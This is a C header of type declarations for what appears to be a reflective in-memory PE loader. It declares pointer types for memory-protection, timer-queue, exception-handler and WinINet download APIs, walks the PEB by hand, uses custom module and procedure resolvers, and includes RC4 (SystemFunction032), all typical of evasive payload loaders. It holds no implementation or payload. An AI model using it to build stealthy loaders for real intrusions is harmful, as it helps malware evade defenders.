#pragma once

#include <Windows.h>

typedef LPVOID HINTERNET;
typedef BOOL (WINAPI* tVirtualProtect) (IN LPVOID lpAddress,IN SIZE_T dwSize,IN DWORD flNewProtect,OUT PDWORD lpflOldProtect);
typedef LPVOID (WINAPI* tVirtualAlloc) (IN LPVOID lpAddress, IN SIZE_T dwSize, IN DWORD flAllocationType, IN DWORD flProtect);
typedef BOOL (WINAPI* tCreateTimerQueueTimer) (OUT PHANDLE phNewTimer, IN HANDLE TimerQueue, IN WAITORTIMERCALLBACK Callback, IN PVOID Parameter, IN DWORD DueTime, IN DWORD Period, IN ULONG Flags);
typedef PVOID (WINAPI* tAddVectoredExceptionHandler) (IN ULONG First, PVECTORED_EXCEPTION_HANDLER Handler);
typedef HMODULE (WINAPI* tLoadLibraryA) (IN LPCSTR lpLibFileName);
typedef HMODULE (WINAPI* tLoadLibraryW) (IN LPCWSTR lpLibFileName);
typedef BOOLEAN (NTAPI* tRtlAddFunctionTable) (IN PRUNTIME_FUNCTION FunctionTable, IN DWORD EntryCount, IN DWORD64 BaseAddress);
typedef HANDLE(WINAPI* tCreateTimerQueue)();

typedef HINTERNET (WINAPI* tInternetOpenUrlA) (IN HINTERNET hInternet, IN LPCSTR lpszUrl, IN LPCSTR lpszHeaders, IN DWORD dwHeadersLength, IN DWORD dwFlags, IN DWORD_PTR dwContext);
typedef HINTERNET (WINAPI* tInternetOpenA) (IN LPCSTR lpszAgent, IN DWORD dwAccessType, IN LPCSTR lpszProxy, IN LPCSTR lpszProxyBypass, IN DWORD dwFlags);
typedef BOOL (WINAPI* tInternetReadFile) (IN HINTERNET hFile, OUT LPVOID lpBuffer, IN DWORD dwNumberOfBytesToRead, OUT LPDWORD lpdwNumberOfBytesRead);
typedef BOOL (WINAPI* tInternetSetOptionA) (IN HINTERNET hInternet, IN DWORD dwOption, IN LPVOID lpBuffer, IN DWORD dwBufferLength);
typedef BOOL (WINAPI* tInternetCloseHandle) (IN HINTERNET hInternet);

typedef struct _UNICODE_STRING
{
	USHORT Length;
	USHORT MaximumLength;
	PWCH Buffer;
} UNICODE_STRING;


typedef struct _RTL_USER_PROCESS_PARAMETERS
{
    BYTE Reserved1[16];
    PVOID Reserved2[10];
    UNICODE_STRING ImagePathName;
    UNICODE_STRING CommandLine;
} RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;

typedef struct _PEB_LDR_DATA
{
    BYTE Reserved1[8];
    PVOID Reserved2[3];
    LIST_ENTRY InMemoryOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;
 
typedef struct _LDR_DATA_TABLE_ENTRY
{
    PVOID Reserved1[2];
    LIST_ENTRY InMemoryOrderLinks;
    PVOID Reserved2[2];
    PVOID DllBase;
    PVOID Reserved3[2];
    UNICODE_STRING FullDllName;
    BYTE Reserved4[8];
    PVOID Reserved5[3];
    union {
        ULONG CheckSum;
        PVOID Reserved6;
    } DUMMYUNIONNAME;
    ULONG TimeDateStamp;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;
 
typedef
VOID
(NTAPI *PPS_POST_PROCESS_INIT_ROUTINE)(
    VOID);
 
typedef struct _PEB
{
    BYTE Reserved1[2];
    BYTE BeingDebugged;
    BYTE Reserved2[1];
    PVOID Reserved3[2];
    PPEB_LDR_DATA Ldr;
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
    PVOID Reserved4[3];
    PVOID AtlThunkSListPtr;
    PVOID Reserved5;
    ULONG Reserved6;
    PVOID Reserved7;
    ULONG Reserved8;
    ULONG AtlThunkSListPtr32;
    PVOID Reserved9[45];
    BYTE Reserved10[96];
    PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;
    BYTE Reserved11[128];
    PVOID Reserved12[1];
    ULONG SessionId;
} PEB, *PPEB;
	
typedef struct _PE_HEADERS
{
	PBYTE                    pFileBuffer;
	DWORD                    dwFileSize;

	PIMAGE_NT_HEADERS        pImgNtHdrs;
	PIMAGE_SECTION_HEADER    pImgSecHdr;

	PIMAGE_DATA_DIRECTORY    pEntryImportDataDir;
	PIMAGE_DATA_DIRECTORY    pEntryBaseRelocDataDir;
	PIMAGE_DATA_DIRECTORY    pEntryTLSDataDir;
	PIMAGE_DATA_DIRECTORY    pEntryExceptionDataDir;
	PIMAGE_DATA_DIRECTORY    pEntryExportDataDir;

	BOOL                     bIsDLLFile;
} PE_HEADERS, *PPE_HEADERS;

typedef struct _BASE_RELOCATION_ENTRY {
	WORD Offset : 12;
	WORD Type : 4;
} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;

typedef BOOL(WINAPI* MAIN)();

typedef struct _USTRING {
	DWORD Length;
	DWORD MaximumLength;
	unsigned char* Buffer;
} USTRING, *PUSTRING;

typedef NTSTATUS(WINAPI* pSystemFunction032)(PUSTRING uStrBuffer, PUSTRING uStrKey);

HMODULE hlpGetModuleHandle(IN LPCWSTR sModuleName);

FARPROC hlpGetProcAddress(IN HMODULE hModule, IN LPCSTR lpApiName);